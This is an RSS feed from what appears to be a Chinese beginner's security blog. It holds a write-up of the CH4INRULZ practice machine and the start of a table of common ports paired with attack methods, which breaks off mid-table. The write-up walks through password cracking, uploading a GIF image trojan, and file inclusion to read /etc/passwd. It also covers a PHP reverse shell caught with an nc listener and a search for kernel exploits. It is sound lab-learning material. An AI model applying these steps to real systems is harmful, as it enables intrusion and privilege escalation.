<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Go Forward</title>
        <link>https://chungod.github.io</link>
        <description>欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷</description>
        <language>zh-CN</language>
        <pubDate>Tue, 23 Nov 2021 15:48:35 +0800</pubDate>
        <lastBuildDate>Tue, 23 Nov 2021 15:48:35 +0800</lastBuildDate>
        <category>Chanakya靶场笔记</category>
        <category>CH4INRULZ靶机笔记</category>
        <category>Coablt strike总结</category>
        <category>Gear_Of_War靶场笔记</category>
        <category>Linux反弹shell多种姿态</category>
        <category>Linux提权笔记</category>
        <category>Windows内核提权</category>
        <category>paramiko模块介绍</category>
        <category>impacket脚本利用</category>
        <category>php危险函数</category>
        <category>内存取证</category>
        <category>meterpreter学习笔记</category>
        <category>溯源取证总结</category>
        <category>常用端口漏洞利用</category>
        <category>upload-labs通关记录</category>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/11/23/CH4INRULZ%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</guid>
            <title>CH4INRULZ靶机笔记</title>
            <link>https://chungod.github.io/2021/11/23/CH4INRULZ%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</link>
            <category>CH4INRULZ靶机笔记</category>
            <pubDate>Tue, 23 Nov 2021 15:48:35 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;ch4inrulz靶机笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ch4inrulz靶机笔记&#34;&gt;#&lt;/a&gt; CH4INRULZ 靶机笔记&lt;/h2&gt;
&lt;h5 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h5&gt;
&lt;p&gt;首先需要进行主机发现&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路: 通过arp-scan -l 进行扫描 ，找到目标主机的MAC地址为00:0c:29:ed:8a:e7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122210612832.png&#34; alt=&#34;image-20211122210612832&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 nmap 进行初步探测，发现开放了 21、22、80、8011 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122210727745.png&#34; alt=&#34;image-20211122210727745&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现有两个 Web 端口，利用 dirb 进行扫描其目录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dirb http://IP  (发现只扫描出几个目录)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirb http://IP:8011/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122210906429.png&#34; alt=&#34;image-20211122210906429&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122211038557.png&#34; alt=&#34;image-20211122211038557&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123191304864.png&#34; alt=&#34;image-20211123191304864&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h5&gt;
&lt;p&gt;浏览器发现登录后台&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122211409036.png&#34; alt=&#34;image-20211122211409036&#34;&gt; 继续进行收集，发现 dirb 存在 &lt;code&gt;index.html.bak&lt;/code&gt;  文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122211608812.png&#34; alt=&#34;image-20211122211608812&#34;&gt;&lt;/p&gt;
&lt;p&gt;将其下载下来，发现存在 frank 用户及密码（利用 john 工具破解）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122211745050.png&#34; alt=&#34;image-20211122211745050&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122211841319.png&#34; alt=&#34;image-20211122211841319&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用这个用户进行登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122212021586.png&#34; alt=&#34;image-20211122212021586&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现存在上传点，上传反弹图片木马，进行 getshell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122212529338.png&#34; alt=&#34;image-20211122212529338&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122212618674.png&#34; alt=&#34;image-20211122212618674&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 gif 图片马进行上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122212733758.png&#34; alt=&#34;image-20211122212733758&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件包含&#34;&gt;#&lt;/a&gt; 文件包含&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;成功上传后，才是重头戏，需要找到文件路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;转移目标到8081端口，发现存在一些php文件（包含）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122213026227.png&#34; alt=&#34;image-20211122213026227&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;发现可以访问files_api.php，看文件名可能为文件包含&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122213150175.png&#34; alt=&#34;image-20211122213150175&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;尝试利用GET请求进行文件包含/etc/passwd  (失败)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122213236176.png&#34; alt=&#34;image-20211122213236176&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;转变思路：尝试使用post请求进行文件包含,成功包含passwd文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122213607494.png&#34; alt=&#34;image-20211122213607494&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;既然能进行任意文件读取，那么我们可以读取upload.php来获得文件上传路径，但是这里也不知道80端口文件路径。这里通过apache的配置文件/etc/apache2/sites-enabled/000-default来获得&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122214023563.png&#34; alt=&#34;image-20211122214023563&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路一：猜测路径，看提示说是my uploads,因为用户为Franch，成功&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;找到上传路径http://IP/development/uploader/FRANKuploads/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122214123527.png&#34; alt=&#34;image-20211122214123527&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路二：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;利用php://filter结合php伪协议读取uploader.php里面的内容包含&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/www/development/uploader/upload.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122214627358.png&#34; alt=&#34;image-20211122214627358&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122214825668.png&#34; alt=&#34;image-20211122214825668&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;将其进行base64解码，找到上传路径FRANKuploads/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211122214936489.png&#34; alt=&#34;image-20211122214936489&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;getshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#getshell&#34;&gt;#&lt;/a&gt; getshell&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;方法一：通过文件包含语句，包含已上传的gif木马，成功getshell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123171835744.png&#34; alt=&#34;image-20211123171835744&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123172202574.png&#34; alt=&#34;image-20211123172202574&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123171904017.png&#34; alt=&#34;image-20211123171904017&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;方法二：也可以利用到kali里面自带的php-reverse-shell.php文件。路径是/usr/share/webshells/php/php-reverse-shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123172343678.png&#34; alt=&#34;image-20211123172343678&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;将IP地址修改成kali的地址和kali开启的监听端口，加上GIF89a图片头改成gif后缀上传&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123172438798.png&#34; alt=&#34;image-20211123172438798&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc 进行监听端口1234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 1234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;同时文件包含访问我们刚刚上传的那个用来反弹shell的文件。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123172855804.png&#34; alt=&#34;image-20211123172855804&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123172951626.png&#34; alt=&#34;image-20211123172951626&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123173002488.png&#34; alt=&#34;image-20211123173002488&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname -a 查看内核版本为Linux ubuntu 2.6.35-19-generic&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123173135449.png&#34; alt=&#34;image-20211123173135449&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;搜索可利用的提权脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searchsploit linux 2.6.3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;发现可以通过脏牛提权40839.c,内核提权15023.c，15285.c进行渗透&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123173828857.png&#34; alt=&#34;image-20211123173828857&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20211123174138404.png&#34; alt=&#34;image-20211123174138404&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/11/19/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</guid>
            <title>常用端口漏洞利用</title>
            <link>https://chungod.github.io/2021/11/19/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</link>
            <category>常用端口漏洞利用</category>
            <pubDate>Fri, 19 Nov 2021 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h4 id=&#34;常用端口漏洞利用总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用端口漏洞利用总结&#34;&gt;#&lt;/a&gt; 常用端口漏洞利用总结&lt;/h4&gt;
&lt;p&gt;漏洞入侵&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;端口&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;服务&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;入侵方式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;21&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ftp/tftp/vsftpd 文件传输协议&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 嗅探 / 溢出 / 后门&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;22&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ssh 远程连接&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 /openssh 漏洞&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;23&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Telnet 远程连接&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 嗅探 / 弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;25&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;SMTP 邮件服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;邮件伪造&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;53&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;DNS 域名解析系统&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;域传送 / 劫持 / 缓存投毒 / 欺骗&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;67/68&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;dhcp 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;劫持 / 欺骗&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;110&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;pop3&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 嗅探&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;139&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Samba 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 未授权访问 / 远程命令执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;143&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Imap 协议&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;161&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;SNMP 协议&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 搜集目标内网信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;389&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Ldap 目录访问协议&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;注入 / 未授权访问 / 弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;445&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;smb&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ms17-010 / 端口溢出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;512/513/514&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Linux Rexec 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / Rlogin 登陆&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;873&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Rsync 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;文件上传 / 未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1080&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;socket&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1352&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Lotus domino 邮件服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 信息泄漏&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1433&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;mssql&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 注入 / SA 弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1521&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;oracle&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 注入 / TNS 爆破 / 反弹 shell&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2049&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Nfs 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;配置不当&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2181&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;zookeeper 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2375&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;docker remote api&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3306&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;mysql&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 注入&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3389&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Rdp 远程桌面链接&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 /shift 后门&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;4848&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;GlassFish 控制台&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 认证绕过&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5000&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;sybase/DB2 数据库&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 注入 / 提权&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5432&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;postgresql&lt;/td&gt;
